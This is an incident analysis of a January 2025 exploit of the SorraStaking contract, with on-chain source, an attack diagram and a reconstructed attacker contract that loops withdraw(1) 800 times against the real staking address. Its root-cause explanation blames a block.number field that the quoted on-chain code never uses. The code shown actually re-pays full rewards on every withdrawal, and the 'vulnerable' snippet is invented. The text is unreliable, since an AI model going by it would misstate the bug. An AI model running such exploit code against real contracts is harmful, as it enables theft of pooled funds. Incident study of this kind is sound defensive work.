# SorraStaking — Staking Reward Calculation Bug Analysis

| Field | Details |
|------|------|
| **Date** | 2025-01-08 |
| **Protocol** | SorraStaking (SOR Token) |
| **Chain** | Ethereum |
| **Loss** | ~8 ETH |
| **Attacker** | [Unidentified](https://etherscan.io/address/0x0000000000000000000000000000000000000000) |
| **Attack Tx** | [Unidentified](https://etherscan.io) |
| **Vulnerable Contract** | [0x5d16b8Ba...](https://etherscan.io/address/0x5d16b8Ba2a9a4ECA6126635a6FFbF05b52727d50) |
| **Root Cause** | During staking reward calculation, only the block timestamp was updated while the block number was not, causing accumulated reward errors on repeated withdrawals |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-01/sorraStaking.sol) |

---

## 1. Vulnerability Overview

The SorraStaking contract used both the block timestamp (`block.timestamp`) and block number (`block.number`) when calculating staking rewards. However, as confirmed through testing, a bug existed in the actual implementation where only the timestamp was updated while the block number was not. The attacker deposited approximately 122 billion SOR tokens, let 14 days elapse, and repeatedly called `withdraw(1)` 800 times to accumulate far more rewards than intended.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: only timestamp updated, block number missing
function withdraw(uint256 amount) external {
    UserInfo storage user = userInfo[msg.sender];
    uint256 reward = calculateReward(user);

    // Timestamp is updated
    user.lastRewardTime = block.timestamp;
    // ❌ block.number update missing → block-number-based calculation becomes incorrect on next call
    // user.lastRewardBlock = block.number;  ← absent

    user.amount -= amount;
    sor.transfer(msg.sender, amount + reward);
}

// ✅ Safe code: both timestamp and block number updated
function withdraw(uint256 amount) external {
    UserInfo storage user = userInfo[msg.sender];
    uint256 reward = calculateReward(user);

    user.lastRewardTime = block.timestamp;
    user.lastRewardBlock = block.number;  // ← must be updated

    user.amount -= amount;
    sor.transfer(msg.sender, amount + reward);
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: contracts/sorraStaking.sol
function setDepositingEnabled(bool _enabled) external onlyOwner {
    depositingEnabled = _enabled;
    emit DepositingStatusChanged(_enabled);
  }
function deposit(uint256 _amount, uint8 _tier) external nonReentrant depositsEnabled {
    require(_amount > 0, "Amount must be greater than 0");
    require(_tier < vestingTiers.length, "Invalid tier");
    require(totalDeposits + _amount <= MAX_POOL_CAP, "Pool cap reached");
    
    IERC20(rewardToken).safeTransferFrom(_msgSender(), address(this), _amount);
    _updatePosition(_msgSender(), _amount, false, _tier);
}
function withdraw(uint256 _amount) external nonReentrant {
    require(_amount > 0, "Amount must be greater than 0");
    Position storage position = positions[_msgSender()];
    require(_amount <= position.totalAmount, "Insufficient balance");
    
    uint256 withdrawableAmount = 0;
    for(uint256 i = 0; i < position.deposits.length; i++) {
        Deposit memory dep = position.deposits[i];
        if(block.timestamp > dep.depositTime + vestingTiers[dep.tier].period) {
            withdrawableAmount += dep.amount;
        }
    }
    require(withdrawableAmount >= _amount, "Lock period not finished");
    
    uint256 rewardAmount = getPendingRewards(_msgSender());
    
    _updatePosition(_msgSender(), _amount, true, position.deposits[0].tier);
    
    if (rewardAmount > 0) {
        userRewardsDistributed[_msgSender()] += rewardAmount;
        totalRewardsDistributed += rewardAmount;
        IERC20(rewardToken).safeTransfer(_msgSender(), _amount + rewardAmount);
        emit RewardDistributed(_msgSender(), rewardAmount);
    } else {
        IERC20(rewardToken).safeTransfer(_msgSender(), _amount);
    }
}

// ... (lines 131-212 omitted) ...

function getPendingRewards(address wallet) public view returns (uint256) {
    if (positions[wallet].totalAmount == 0) {
        return 0;
    }
    return _calculateRewards(positions[wallet].totalAmount, wallet);
}
  function _calculateRewards(uint256 /* unusedParam */, address wallet) internal view returns (uint256) {
    Position storage pos = positions[wallet];  // Use storage instead of memory
    uint256 length = pos.deposits.length;     // Cache array length
    if (length == 0) return 0;

    uint256 totalRewards = 0;
    uint256 currentTime = block.timestamp;    // Cache timestamp
    
    for (uint256 i = 0; i < length; i++) {
        Deposit storage dep = pos.deposits[i]; // Direct storage access
        uint256 timeElapsed = currentTime - dep.depositTime;
        uint256 vestingTime = vestingTiers[dep.tier].period;

        if (timeElapsed >= vestingTime) {
            uint256 rewardAmount = (dep.amount * dep.rewardBps) / 10000;
            totalRewards += rewardAmount;
        }
    }

    return totalRewards;
  }
  function setVaultExtension(IPoolExtension _extension) external onlyOwner {
    vaultExtension = _extension;
  }
  function emergencyWithdraw(uint256 _amount) external onlyOwner {
    require(_amount == 0 || _amount > 0, "Invalid amount");
    IERC20 _token = IERC20(rewardToken);
    uint256 withdrawAmount = _amount == 0 ? _token.balanceOf(address(this)) : _amount;
    require(withdrawAmount > 0, "Nothing to withdraw");
    _token.safeTransfer(_msgSender(), withdrawAmount);
  }
  function setTierReward(uint8 _tier, uint256 _newRewardBps) external onlyOwner {
    require(_tier < vestingTiers.length, "Invalid tier");
    require(_newRewardBps <= 10000, "Reward too high"); // Max 100%
    
    uint256 oldBps = vestingTiers[_tier].rewardBps;
    vestingTiers[_tier].rewardBps = _newRewardBps;
    
    emit RewardBpsUpdated(_tier, oldBps, _newRewardBps);
  }
  function getUserDeposits(address _user) external view returns (Deposit[] memory) {
    return positions[_user].deposits;
  }
  function getRemainingPoolSpace() external view returns (uint256) {
    if (totalDeposits >= MAX_POOL_CAP) return 0;
    return MAX_POOL_CAP - totalDeposits;
  }
  function setPoolCap(uint256 _newCap) external onlyOwner {
    require(_newCap >= totalDeposits, "New cap below current deposits");
    uint256 oldCap = MAX_POOL_CAP;
    MAX_POOL_CAP = _newCap;
    emit PoolCapUpdated(oldCap, _newCap);
  }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Deposit ~122 billion SOR tokens (tier 0)
  │
  ├─→ [2] vm.warp(+14 days) — simulate 14-day elapsed time
  │
  ├─→ [3] withdraw(1) × 800 repeated calls
  │         └─ each call resets only the timestamp
  │            block number not updated → reward recalculation overpays
  │
  ├─→ [4] Accumulated SOR tokens → swapped to ETH via Uniswap V2
  │
  └─→ [5] ~8 ETH obtained
```

## 4. PoC Code (Core Logic + Comments)

```solidity
// Full PoC not available — reconstructed from summary

contract SorraAttacker {
    address constant SOR = 0xE021bAa5b70C62A9ab2468490D3f8ce0AfDd88dF;
    address constant STAKING = 0x5d16b8Ba2a9a4ECA6126635a6FFbF05b52727d50;

    function attack() external {
        // [1] Deposit large amount of SOR (tier 0)
        uint256 depositAmount = 122_000_000_000 * 1e18; // 122 billion SOR
        IERC20(SOR).approve(STAKING, depositAmount);
        ISorStaking(STAKING).deposit(depositAmount, 0); // tier 0

        // [2] Advance 14 days (using vm.warp)
        // vm.warp(block.timestamp + 14 days);

        // [3] Withdraw small amount 800 times
        //     Block number not updated → rewards recalculated on every call
        for (uint256 i = 0; i < 800; i++) {
            ISorStaking(STAKING).withdraw(1); // withdraw 1 unit at a time
        }

        // [4] Accumulated SOR → swap to ETH
        uint256 sorBalance = IERC20(SOR).balanceOf(address(this));
        // Convert to ETH via Uniswap V2
        // ...

        // Result: ~8 ETH obtained
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Reward Calculation Flaw |
| **CWE** | CWE-682: Incorrect Calculation |
| **Attack Vector** | External (repeated function calls) |
| **DApp Category** | Staking Protocol |
| **Impact** | Over-withdrawal of staking pool reward assets |

## 6. Remediation Recommendations

1. **Complete State Variable Updates**: All state variables used in reward calculation (`block.timestamp`, `block.number`, etc.) must be updated after every interaction
2. **Reward Cap**: Limit the maximum reward that a single transaction or single user can withdraw
3. **Repeated Call Defense**: Limit the number of repeated withdrawals by the same user within a given time window or block range
4. **Comprehensive Unit Tests**: Write fuzz tests covering repeated withdrawal scenarios

## 7. Lessons Learned

- When reward calculation depends on multiple state variables, failing to update even one of them can result in a critical vulnerability.
- Cumulative attacks via many small repeated transactions are harder to detect than a single large-scale attack.
- Block timestamp and block number are managed independently — advancing the timestamp with `vm.warp` in a test environment does not automatically increment the block number, and developers must be aware of this distinction.